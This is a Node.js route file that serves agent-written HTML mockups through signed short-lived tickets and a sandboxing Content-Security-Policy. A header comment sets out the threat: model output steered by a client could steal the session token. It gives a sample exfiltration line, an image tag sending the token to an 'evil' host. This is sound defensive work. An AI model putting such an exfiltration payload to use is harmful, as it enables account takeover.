/**
 * The Camada 0 loop, and the one place agent-written HTML is served to a browser.
 *
 * These routes also give `mockups.read` and `mockups.write` — advertised to every agent
 * in `agent-tools.js` since before anything implemented them — something real behind the
 * name.
 */
const crypto = require('crypto');
const mockupSessions = require('./mockup-sessions');
const secretBox = require('./secret-box');

/**
 * A browser cannot put an Authorization header on an `<iframe src>`, and this app
 * authenticates with a bearer token in localStorage rather than a cookie. So the render
 * URL carries its own short-lived, narrowly-scoped permission instead.
 *
 * The ticket grants exactly one thing — view this one iteration of this one mockup, for
 * the next minute. It is not a session, it cannot be replayed against any other URL, and
 * it exposes nothing about the person who asked for it. That is the whole reason it is
 * acceptable in a query string when a session token would not be.
 */
const TICKET_TTL_MS = 60 * 1000;

function ticketPayload(projectId, sessionId, iterationId, expiresAt) {
  return `${projectId}:${sessionId}:${iterationId}:${expiresAt}`;
}

function signTicket(dataDir, projectId, sessionId, iterationId, now = Date.now()) {
  const expiresAt = now + TICKET_TTL_MS;
  const signature = crypto
    .createHmac('sha256', secretBox.signingKey(dataDir))
    .update(ticketPayload(projectId, sessionId, iterationId, expiresAt))
    .digest('base64url');
  return `${expiresAt}.${signature}`;
}

function ticketValid(dataDir, projectId, sessionId, iterationId, ticket, now = Date.now()) {
  const [rawExpiry, signature] = String(ticket || '').split('.');
  const expiresAt = Number(rawExpiry);
  if (!Number.isFinite(expiresAt) || expiresAt < now || !signature) return false;
  const expected = crypto
    .createHmac('sha256', secretBox.signingKey(dataDir))
    .update(ticketPayload(projectId, sessionId, iterationId, expiresAt))
    .digest('base64url');
  const given = Buffer.from(signature);
  const want = Buffer.from(expected);
  return given.length === want.length && crypto.timingSafeEqual(given, want);
}

/**
 * The headers that make serving agent-written HTML safe.
 *
 * This matters more here than it looks. The session token lives in `localStorage`, the
 * app sets no CSP of its own, and the HTML below was written by a model steered by a
 * client-supplied sentence. Served naively into a same-origin frame, a mockup could read
 * that token and post it anywhere — account takeover through the product's front door.
 *
 *  - `sandbox` as a **CSP directive**, with no `allow-*` tokens, puts the document in an
 *    opaque origin: no localStorage, no window.parent, no cookies. Unlike the iframe
 *    attribute it still applies when someone opens the URL in a tab of its own, which
 *    someone eventually will.
 *  - `default-src 'none'` with no `script-src` blocks script execution *and* every
 *    outbound request, which closes the `<img src="https://evil/?token=">` channel too.
 *    A Camada 0 mockup is specified as one screen with no logic and no real data, so
 *    this enforces the spec rather than fighting it. Never add `allow-scripts`.
 *  - The HTML is deliberately **not sanitised**. Sanitising adversarial markup is an
 *    arms race; the sandbox is the boundary, and a sanitiser here would only buy
 *    confidence that is not earned.
 */
const RENDER_HEADERS = {
  'Content-Type': 'text/html; charset=utf-8',
  'X-Content-Type-Options': 'nosniff',
  'Cache-Control': 'no-store',
  'Content-Security-Policy': [
    'sandbox',
    "default-src 'none'",
    "style-src 'unsafe-inline'",
    'img-src data:',
    'font-src data:',
    "form-action 'none'",
    "base-uri 'none'",
    "frame-ancestors 'self'",
  ].join('; '),
};

function registerMockupRoutes(app, deps) {
  const {
    authMiddleware,
    loadProjectForUser,
    requireProjectEditor,
    updateStore,
    appendActivity,
    nowIso,
    dataDir,
    readJson,
    writeJson,
    startMockupRun,
  } = deps;

  const blobDeps = { dataDir, readJson, writeJson };

  app.get('/api/projects/:projectId/mockups', authMiddleware, loadProjectForUser, async (req, res) => {
    const sessions = mockupSessions.listSessions(req.loadedProject).map(mockupSessions.sessionView);
    return res.json({ sessions });
  });

  app.post('/api/projects/:projectId/mockups', authMiddleware, loadProjectForUser, requireProjectEditor, async (req, res) => {
    try {
      let view = null;
      await updateStore(async (store) => {
        const project = store.projects.find((entry) => entry.id === req.params.projectId);
        if (!project) throw new Error('Projeto nao encontrado.');
        const session = mockupSessions.startSession(project, {
          promptText: req.body?.promptText,
          title: req.body?.title,
          epicId: req.body?.epicId,
          maxIterations: req.body?.maxIterations,
          maxCostUsd: req.body?.maxCostUsd,
          actorUserId: req.auth?.user?.id,
        }, nowIso());
        project.updatedAt = nowIso();
        view = mockupSessions.sessionView(session);
        appendActivity(store, {
          actorUserId: req.auth.user.id,
          projectId: project.id,
          action: 'mockup_session_started',
          details: { sessionId: session.id },
        });
      });
      return res.json({ session: view });
    } catch (error) {
      return res.status(400).json({ message: error.message });
    }
  });

  /**
   * One turn of the loop.
   *
   * Dispatched directly rather than through the Execução driver: `decideNext` never sees
   * this, no persona history is written, and no stage fingerprint moves — so iterating
   * here cannot make a running Execução go stale.
   */
  app.post('/api/projects/:projectId/mockups/:sessionId/iterate', authMiddleware, loadProjectForUser, requireProjectEditor, async (req, res) => {
    try {
      const project = req.loadedProject;
      const session = mockupSessions.findSession(project, req.params.sessionId);
      const blocked = mockupSessions.blockedReason(session);
      if (blocked) return res.status(409).json({ message: blocked });

      const previousId = session.iterations[session.iterations.length - 1]?.id || '';
      const previousHtml = previousId
        ? await mockupSessions.loadIterationHtml(blobDeps, project.id, previousId)
        : '';

      const produced = await startMockupRun({
        projectId: project.id,
        session,
        requestText: String(req.body?.requestText || ''),
        previousHtml,
        actorUserId: req.auth?.user?.id || '',
      });
      if (produced?.error) return res.status(produced.status || 502).json({ message: produced.error });

      let view = null;
      let iterationId = '';
      await updateStore(async (store) => {
        const target = store.projects.find((entry) => entry.id === req.params.projectId);
        if (!target) throw new Error('Projeto nao encontrado.');
        const result = mockupSessions.addIteration(target, req.params.sessionId, {
          html: produced.html,
          requestText: req.body?.requestText,
          summary: produced.summary,
          costUsd: produced.costUsd,
          llmOptionId: produced.llmOptionId,
        }, previousHtml, nowIso());
        iterationId = result.iteration.id;
        target.updatedAt = nowIso();
        view = mockupSessions.sessionView(result.session);
        appendActivity(store, {
          actorUserId: req.auth.user.id,
          projectId: target.id,
          action: 'mockup_iterated',
          details: {
            sessionId: req.params.sessionId,
            iterationId,
            changedLines: result.iteration.changedLines,
            costUsd: result.iteration.costUsd,
          },
        });
      });

      // The body is written only once the record that points at it exists, so a failed
      // write cannot leave an iteration referring to nothing.
      await mockupSessions.saveIterationHtml(blobDeps, req.params.projectId, iterationId, produced.html);
      return res.json({ session: view });
    } catch (error) {
      return res.status(400).json({ message: error.message });
    }
  });

  /**
   * Aprovar / Pedir alteração / Descartar.
   *
   * Approval is the only verdict that writes into project state, which is correct: it
   * is the `ux_mockup → ux_mockup_approved` transform the build policy already declares,
   * and it is the one moment the discovery fingerprint should move.
   */
  app.post('/api/projects/:projectId/mockups/:sessionId/verdict', authMiddleware, loadProjectForUser, requireProjectEditor, async (req, res) => {
    try {
      const verdict = String(req.body?.verdict || '');
      let view = null;
      let promoted = null;
      await updateStore(async (store) => {
        const project = store.projects.find((entry) => entry.id === req.params.projectId);
        if (!project) throw new Error('Projeto nao encontrado.');
        const session = mockupSessions.recordVerdict(
          project, req.params.sessionId, req.body?.iterationId, verdict, nowIso(),
        );
        if (verdict === 'approved') {
          promoted = {
            id: `diag_${session.approvedIterationId}`,
            kind: 'mockup',
            title: session.title || 'Mockup aprovado',
            mockupSessionId: session.id,
            mockupIterationId: session.approvedIterationId,
            deliveryStageId: 'discovery',
            createdAt: nowIso(),
          };
          project.diagramArtifacts = [...(project.diagramArtifacts || []), promoted];
        }
        project.updatedAt = nowIso();
        view = mockupSessions.sessionView(session);
        appendActivity(store, {
          actorUserId: req.auth.user.id,
          projectId: project.id,
          action: `mockup_${verdict}`,
          details: { sessionId: req.params.sessionId, iterationId: req.body?.iterationId },
        });
      });
      return res.json({ session: view, promoted });
    } catch (error) {
      return res.status(400).json({ message: error.message });
    }
  });

  /** A one-minute permission to view one mockup, for the iframe that cannot send a header. */
  app.post('/api/projects/:projectId/mockups/:sessionId/:iterationId/ticket', authMiddleware, loadProjectForUser, async (req, res) => {
    const session = mockupSessions.findSession(req.loadedProject, req.params.sessionId);
    if (!session?.iterations.some((entry) => entry.id === req.params.iterationId)) {
      return res.status(404).json({ message: 'Este mockup já não existe.' });
    }
    return res.json({
      ticket: signTicket(dataDir, req.params.projectId, req.params.sessionId, req.params.iterationId),
      expiresInMs: TICKET_TTL_MS,
    });
  });

  /**
   * The rendered mockup. Read the header block at the top of this file before changing
   * anything here.
   *
   * Authenticated by ticket rather than by the usual middleware, because the caller is
   * an iframe. The ticket is checked before anything is read from disk.
   */
  app.get('/api/projects/:projectId/mockups/:sessionId/:iterationId/render', async (req, res) => {
    res.set(RENDER_HEADERS);
    const { projectId, sessionId, iterationId } = req.params;
    if (!ticketValid(dataDir, projectId, sessionId, iterationId, req.query?.t)) {
      return res.status(403).send('<!doctype html><meta charset="utf-8"><p>Esta ligação expirou. Volte a abrir o mockup.</p>');
    }
    const html = await mockupSessions.loadIterationHtml(blobDeps, projectId, iterationId);
    return res.send(html || '<!doctype html><meta charset="utf-8"><p>Mockup vazio.</p>');
  });
}

module.exports = { registerMockupRoutes, RENDER_HEADERS, signTicket, ticketValid, TICKET_TTL_MS };
